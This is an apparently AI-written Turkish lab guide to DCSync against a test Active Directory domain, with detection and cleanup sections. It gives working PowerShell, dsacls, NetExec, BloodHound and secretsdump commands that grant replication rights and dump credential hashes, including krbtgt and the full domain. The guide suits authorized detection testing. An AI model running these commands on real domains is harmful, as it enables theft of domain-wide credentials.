@@ -1,0 +1,545 @@
+Aşağıdaki rehber **yalnızca izole/yetkili lab** içindir. DCSync, AD replikasyon mekanizmasını taklit ederek domain credential verisine erişebildiği için çok yüksek etkili bir tekniktir. Bu rehberde hash kullanımı, Golden Ticket, Pass-the-Hash, persistence veya lateral movement zinciri vermiyorum; sadece **lab’da yetkiyi oluşturma → recon → kontrollü DCSync doğrulama → detection → temizlik** akışını veriyorum.
+
+Senin lab varsayımların:
+
+```text id="36jegj"
+Domain : ndrpoc.local
+DC IP  : 192.168.39.143
+User   : turing
+Pass   : Password3#
+Kali   : saldırı/recon makinesi
+```
+
+DCSync için kritik nokta şudur: hesabın domain root objesi üzerinde en az **Replicating Directory Changes** ve **Replicating Directory Changes All** haklarına sahip olması gerekir. Microsoft, `DS-Replication-Get-Changes-All` hakkını “secret domain data” replikasyonu için kullanılan control access right olarak tanımlar; BloodHound da `GetChanges` + `GetChangesAll` birleşince `DCSync` edge’i oluştuğunu belirtir. ([Microsoft Learn][1])
+
+---
+
+# 1. Lab önkoşulları
+
+## Gerekli hesaplar
+
+Lab’da iki hesap kullanmanı öneririm:
+
+```text id="tmqhmm"
+turing          düşük yetkili kullanıcı, sonra DCSync hakkı verilecek
+dcsyncvictim    test amaçlı normal kullanıcı, hash’i kontrollü çekilecek
+```
+
+DC üzerinde Domain Admin yetkili PowerShell açıp test kullanıcısını oluştur:
+
+```powershell id="u5wknh"
+Import-Module ActiveDirectory
+
+New-ADUser `
+  -Name "DCSync Victim" `
+  -SamAccountName "dcsyncvictim" `
+  -UserPrincipalName "dcsyncvictim@ndrpoc.local" `
+  -AccountPassword (ConvertTo-SecureString 'VictimPass123!' -AsPlainText -Force) `
+  -Enabled $true
+```
+
+## Kali tool kontrolü
+
+Kali’de Impacket gerekli:
+
+```bash id="rqojb1"
+sudo apt update
+sudo apt install -y impacket-scripts python3-impacket bloodhound.py
+pipx install netexec
+```
+
+Binary isimleri Kali sürümüne göre değişebilir. Kontrol et:
+
+```bash id="jdz7i9"
+which secretsdump.py
+which impacket-secretsdump
+```
+
+Sağlam kullanım için değişken oluştur:
+
+```bash id="nkapq1"
+SECRETDUMP=$(command -v secretsdump.py || command -v impacket-secretsdump)
+echo "$SECRETDUMP"
+```
+
+Impacket, SMB/MSRPC/Kerberos gibi protokollerle çalışmak için kullanılan Python tabanlı bir araç setidir; Kali de `python3-impacket` paketini bu amaçla sağlar. `secretsdump.py`, uzak makineden agent çalıştırmadan çeşitli secret/hashes toplamak için kullanılan Impacket örneklerinden biridir. ([Kali Linux][2])
+
+---
+
+# 2. DCSync hakkını lab’da oluşturma
+
+Bu adım **DC üzerinde Domain Admin** ile yapılır. Burada bilerek `turing` kullanıcısına DCSync için gereken replikasyon haklarını vereceğiz.
+
+## Yöntem A — PowerShell ile hak verme
+
+DC üzerinde:
+
+```powershell id="w3z8cw"
+Import-Module ActiveDirectory
+
+$DomainDN = "DC=ndrpoc,DC=local"
+$Principal = "ndrpoc\turing"
+
+$Sid = (New-Object System.Security.Principal.NTAccount($Principal)).
+  Translate([System.Security.Principal.SecurityIdentifier])
+
+$Acl = Get-Acl "AD:$DomainDN"
+
+$Rights = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
+$ControlType = [System.Security.AccessControl.AccessControlType]::Allow
+$Inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+
+$ReplicationGuids = @(
+  [guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", # DS-Replication-Get-Changes
+  [guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", # DS-Replication-Get-Changes-All
+  [guid]"89e95b76-444d-4c62-991a-0facbeda640c"  # DS-Replication-Get-Changes-In-Filtered-Set
+)
+
+foreach ($Guid in $ReplicationGuids) {
+  $Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $Sid,
+    $Rights,
+    $ControlType,
+    $Guid,
+    $Inheritance
+  )
+
+  $Acl.AddAccessRule($Rule)
+}
+
+Set-Acl "AD:$DomainDN" $Acl
+```
+
+Burada verilen haklar:
+
+```text id="0ltc79"
+DS-Replication-Get-Changes
+DS-Replication-Get-Changes-All
+DS-Replication-Get-Changes-In-Filtered-Set
+```
+
+İlk ikisi DCSync için temel gerekliliktir. Üçüncüsü bazı ortamlarda filtered attribute set içeriği için eklenir.
+
+## Yöntem B — dsacls ile hak verme
+
+Alternatif olarak DC’de:
+
+```cmd id="r8ncm9"
+dsacls "DC=ndrpoc,DC=local" /G "ndrpoc\turing:CA;Replicating Directory Changes"
+dsacls "DC=ndrpoc,DC=local" /G "ndrpoc\turing:CA;Replicating Directory Changes All"
+dsacls "DC=ndrpoc,DC=local" /G "ndrpoc\turing:CA;Replicating Directory Changes In Filtered Set"
+```
+
+## Hakların verildiğini kontrol et
+
+DC üzerinde:
+
+```cmd id="au2wcg"
+dsacls "DC=ndrpoc,DC=local" | findstr /i "turing Replicating"
+```
+
+Beklenen mantık:
+
+```text id="c5qgt7"
+turing hesabı domain root objesi üzerinde replication-related control access rights aldı.
+```
+
+---
+
+# 3. Kali’den recon
+
+Önce credential geçerli mi kontrol et:
+
+```bash id="ei6tr8"
+nxc smb 192.168.39.143 \
+  -u turing \
+  -p 'Password3#' \
+  -d ndrpoc.local
+```
+
+LDAP tarafı çalışıyor mu:
+
+```bash id="8lfsck"
+nxc ldap 192.168.39.143 \
+  -u turing \
+  -p 'Password3#' \
+  -d ndrpoc.local
+```
+
+Domain kullanıcılarını gör:
+
+```bash id="a21s00"
+nxc ldap 192.168.39.143 \
+  -u turing \
+  -p 'Password3#' \
+  -d ndrpoc.local \
+  --users
+```
+
+BloodHound için ACL collect al:
+
+```bash id="c0lvch"
+bloodhound-python \
+  -u turing \
+  -p 'Password3#' \
+  -d ndrpoc.local \
+  -ns 192.168.39.143 \
+  -dc 192.168.39.143 \
+  -c ACL,ObjectProps,Group \
+  --zip \
+  -op bh-dcsync-ndrpoc
+```
+
+BloodHound’da şu sorgularla bak:
+
+```cypher id="t9le0u"
+MATCH p=()-[:DCSync]->(:Domain {name:'NDRPOC.LOCAL'})
+RETURN p
+```
+
+Alternatif:
+
+```cypher id="sx0jyg"
+MATCH p=(n)-[:GetChanges|GetChangesAll]->(d:Domain {name:'NDRPOC.LOCAL'})
+RETURN p
+```
+
+Beklenen sonuç:
+
+```text id="bqcz5m"
+TURING@NDRPOC.LOCAL → DCSync → NDRPOC.LOCAL
+```
+
+BloodHound dökümantasyonu, `GetChangesAll` hakkının tek başına abuse edilemediğini; `GetChanges` ile birleştiğinde BloodHound’un abuse edilebilir `DCSync` edge’i oluşturduğunu belirtir. ([bloodhound.specterops.io][3])
+
+---
+
+# 4. Kontrollü DCSync testi
+
+Önce sadece lab için oluşturduğun normal kullanıcıyı hedefle:
+
+```bash id="kqflz0"
+$SECRETDUMP \
+  'ndrpoc.local/turing:Password3#@192.168.39.143' \
+  -dc-ip 192.168.39.143 \
+  -just-dc-user dcsyncvictim
+```
+
+Bu komutun anlamı:
+
+```text id="ges2nd"
+Kali → DC 192.168.39.143
+Kimlik: ndrpoc.local\turing
+Tek hedef kullanıcı: dcsyncvictim
+Amaç: sadece bu kullanıcının replication verisini istemek
+```
+
+Başarılı olursa çıktı içinde şuna benzer bir satır görürsün:
+
+```text id="t5by5e"
+ndrpoc.local\dcsyncvictim:RID:LMHASH:NTHASH:::
+```
+
+Bu, DCSync’in çalıştığını gösterir. Burada hash’i kullanma zincirine girmiyoruz; sadece tekniğin etkisini ve detection sinyalini doğruluyoruz.
+
+## Daha yüksek etkili lab doğrulaması
+
+Sadece izole snapshot lab’da, DCSync’in kritik hesaplarda nasıl göründüğünü test etmek istersen:
+
+```bash id="q5a5qy"
+$SECRETDUMP \
+  'ndrpoc.local/turing:Password3#@192.168.39.143' \
+  -dc-ip 192.168.39.143 \
+  -just-dc-user krbtgt
+```
+
+Bu komut **çok yüksek etkili** bir testtir. `krbtgt` hash’i gerçek ortamlarda domain bütünlüğü açısından kritik kabul edilir. Lab dışına taşıma, paylaşma veya başka zincirlerde kullanma.
+
+## Tüm domain dump — sadece kapalı snapshot lab
+
+Bunu ilk test olarak çalıştırma. NDR/SIEM hacim testi için gerekiyorsa ve lab tamamen izoleyse:
+
+```bash id="nkhggf"
+$SECRETDUMP \
+  'ndrpoc.local/turing:Password3#@192.168.39.143' \
+  -dc-ip 192.168.39.143 \
+  -just-dc \
+  -outputfile dcsync-ndrpoc
+```
+
+Bu komut çok daha gürültülü ve etkili olur. Çıktı dosyalarını lab sonunda sil.
+
+---
+
+# 5. Nereye ne yapıyor?
+
+## Trafik seviyesi
+
+```text id="6qotuy"
+Kaynak : Kali IP
+Hedef  : 192.168.39.143 / DC
+Protokol:
+  - RPC Endpoint Mapper TCP/135
+  - DRSUAPI / MS-DRSR RPC
+  - Dinamik RPC portları
+  - Kimlik doğrulama için Kerberos/NTLM
+```
+
+DCSync, DC gibi davranıp Directory Replication Service Remote Protocol üzerinden replikasyon verisi isteme mantığına dayanır; bu nedenle NDR tarafında en önemli sinyal, **domain controller olmayan bir hostun DC’ye replikasyon çağrısı yapmasıdır**. ([netwrix.com][4])
+
+## Attack mantığı
+
+```text id="qfw143"
+1. turing normal domain user.
+2. Domain root üzerinde replication hakları veriliyor.
+3. turing artık DC gibi replikasyon verisi isteyebiliyor.
+4. Kali’den secretsdump ile DRSUAPI çağrısı yapılıyor.
+5. DC, hedef kullanıcının credential materyalini replication yanıtında döndürüyor.
+```
+
+---
+
+# 6. Detection / NDR / SIEM gözlemi
+
+## Vectra / Darktrace tarafında beklenen davranış
+
+```text id="07rey0"
+Kali_IP → DC_IP RPC Endpoint Mapper bağlantısı
+Kali_IP → DC_IP DRSUAPI/MS-DRSR çağrıları
+Non-DC host performing domain replication-like activity
+Single workstation requesting sensitive directory replication data
+Unusual credential access behavior from non-DC asset
+```
+
+Özellikle şu kural mantığına bak:
+
+```text id="yh6h81"
+Source is not a domain controller
+Destination is domain controller
+Protocol is DCE/RPC / DRSUAPI
+Operation resembles DRSGetNCChanges
+Account is not DC machine account
+```
+
+## Windows event tarafı
+
+DC üzerinde auditing açıksa özellikle:
+
+```text id="08p56g"
+4624 - Network logon
+4672 - Special privileges assigned, bazı durumlarda
+4662 - Directory object access
+4670 - Object permissions changed, hak verme aşamasında
+5136 - Directory object modified, ACL değişikliği görülebilir
+```
+
+DCSync detection’da en önemli event genelde **4662**’dir. 4662 içinde şu GUID’ler aranır:
+
+```text id="teoz03"
+1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  DS-Replication-Get-Changes
+1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  DS-Replication-Get-Changes-All
+89e95b76-444d-4c62-991a-0facbeda640c  DS-Replication-Get-Changes-In-Filtered-Set
+```
+
+Audit’i açmak için DC üzerinde:
+
+```cmd id="bmgwsg"
+auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
+auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
+```
+
+Not: 4662’nin anlamlı gelmesi için domain root objesinde uygun SACL yapılandırması gerekebilir. NDR tarafında ise Windows event olmasa bile DRSUAPI/replikasyon davranışı görülebilir.
+
+---
+
+# 7. Gürültülü test döngüsü
+
+NDR’ın yakalamasını kolaylaştırmak için aynı komutu farklı hedef kullanıcılarla birkaç kez çalıştırabilirsin:
+
+```bash id="vr0m6j"
+for target in dcsyncvictim turing administrator krbtgt; do
+  echo "[*] DCSync test for $target"
+
+  $SECRETDUMP \
+    'ndrpoc.local/turing:Password3#@192.168.39.143' \
+    -dc-ip 192.168.39.143 \
+    -just-dc-user "$target" \
+    | tee "dcsync-$target.txt"
+
+  sleep 10
+done
+```
+
+Bu döngü özellikle şu sinyali üretir:
+
+```text id="1jp4j8"
+Aynı non-DC hosttan DC’ye aralıklı DRSUAPI credential replication istekleri.
+```
+
+---
+
+# 8. Hata durumları ve çözüm
+
+## `rpc_s_access_denied`
+
+```text id="fr6q4i"
+Sebep:
+turing hesabında DCSync için gereken haklar yoktur veya domain root yerine yanlış objeye verilmiştir.
+```
+
+Kontrol:
+
+```cmd id="wojsyn"
+dsacls "DC=ndrpoc,DC=local" | findstr /i "turing Replicating"
+```
+
+## `KDC_ERR_PREAUTH_FAILED` veya auth hatası
+
+```text id="83bf17"
+Sebep:
+Parola yanlış, domain yanlış, saat farkı var veya DNS çözümleme bozuk.
+```
+
+Kali’de:
+
+```bash id="2rwldk"
+sudo ntpdate -u 192.168.39.143
+nxc smb 192.168.39.143 -u turing -p 'Password3#' -d ndrpoc.local
+```
+
+## `STATUS_LOGON_FAILURE`
+
+```text id="m8g8x5"
+Sebep:
+Kullanıcı/parola/domain formatı yanlış.
+```
+
+Doğru format:
+
+```bash id="y1t7xb"
+'ndrpoc.local/turing:Password3#@192.168.39.143'
+```
+
+`#` karakteri olduğu için credential string’i tek tırnak içinde tut.
+
+## `secretsdump.py: command not found`
+
+```bash id="kfeoi8"
+which impacket-secretsdump
+which secretsdump.py
+```
+
+Sonra:
+
+```bash id="eyocmi"
+SECRETDUMP=$(command -v secretsdump.py || command -v impacket-secretsdump)
+```
+
+---
+
+# 9. Lab temizliği
+
+DCSync hakkını geri al. DC üzerinde Domain Admin PowerShell:
+
+```powershell id="jm06aa"
+Import-Module ActiveDirectory
+
+$DomainDN = "DC=ndrpoc,DC=local"
+$Principal = "ndrpoc\turing"
+
+$Sid = (New-Object System.Security.Principal.NTAccount($Principal)).
+  Translate([System.Security.Principal.SecurityIdentifier])
+
+$Acl = Get-Acl "AD:$DomainDN"
+
+$Rights = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
+$ControlType = [System.Security.AccessControl.AccessControlType]::Allow
+$Inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+
+$ReplicationGuids = @(
+  [guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
+  [guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
+  [guid]"89e95b76-444d-4c62-991a-0facbeda640c"
+)
+
+foreach ($Guid in $ReplicationGuids) {
+  $Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+    $Sid,
+    $Rights,
+    $ControlType,
+    $Guid,
+    $Inheritance
+  )
+
+  $Acl.RemoveAccessRule($Rule) | Out-Null
+}
+
+Set-Acl "AD:$DomainDN" $Acl
+```
+
+Kontrol:
+
+```cmd id="h9ze1h"
+dsacls "DC=ndrpoc,DC=local" | findstr /i "turing Replicating"
+```
+
+Kali’de üretilen hash dosyalarını lab sonunda temizle:
+
+```bash id="0x4i4l"
+rm -f dcsync-*.txt dcsync-ndrpoc*
+```
+
+---
+
+# 10. Hardening checklist
+
+DCSync’e karşı savunma tarafında şunları kontrol et:
+
+```text id="8qhdrn"
+Domain root ACL üzerinde kimlerde Replicating Directory Changes var?
+Kimlerde Replicating Directory Changes All var?
+Bu haklar sadece Domain Controllers ve çok sınırlı admin/service hesaplarında mı?
+Service account’lara gereksiz DCSync hakkı verilmiş mi?
+4662 auditing aktif mi?
+Non-DC hostlardan DRSUAPI/MS-DRSR trafiği alarm üretiyor mu?
+BloodHound’da DCSync edge’i olan non-DC/non-admin principal var mı?
+```
+
+Önerilen tekrar recon:
+
+```bash id="6e95ic"
+bloodhound-python \
+  -u turing \
+  -p 'Password3#' \
+  -d ndrpoc.local \
+  -ns 192.168.39.143 \
+  -dc 192.168.39.143 \
+  -c ACL,ObjectProps,Group \
+  --zip \
+  -op bh-dcsync-after-cleanup
+```
+
+Beklenen sonuç:
+
+```text id="ouh83a"
+TURING@NDRPOC.LOCAL için DCSync edge’i artık görünmemeli.
+```
+
+Bu lab için en güvenli çalışma sırası:
+
+```text id="migxfu"
+1. Snapshot al.
+2. dcsyncvictim test kullanıcısını oluştur.
+3. turing’e replication haklarını ver.
+4. BloodHound ile DCSync edge’ini doğrula.
+5. secretsdump ile sadece dcsyncvictim hedefle.
+6. NDR/SIEM loglarını incele.
+7. İstersen krbtgt testini sadece izole snapshot’ta yap.
+8. Hakları geri al.
+9. BloodHound ile edge’in silindiğini doğrula.
+```
+
+[1]: https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all?utm_source=chatgpt.com "DS-Replication-Get-Changes-All extended right"
+[2]: https://www.kali.org/tools/impacket/?utm_source=chatgpt.com "impacket | Kali Linux Tools"
+[3]: https://bloodhound.specterops.io/resources/edges/get-changes-all?utm_source=chatgpt.com "GetChangesAll"
+[4]: https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/dcsync-attack/?utm_source=chatgpt.com "Mastering DCSync Attacks: Techniques, Detection, and ..."
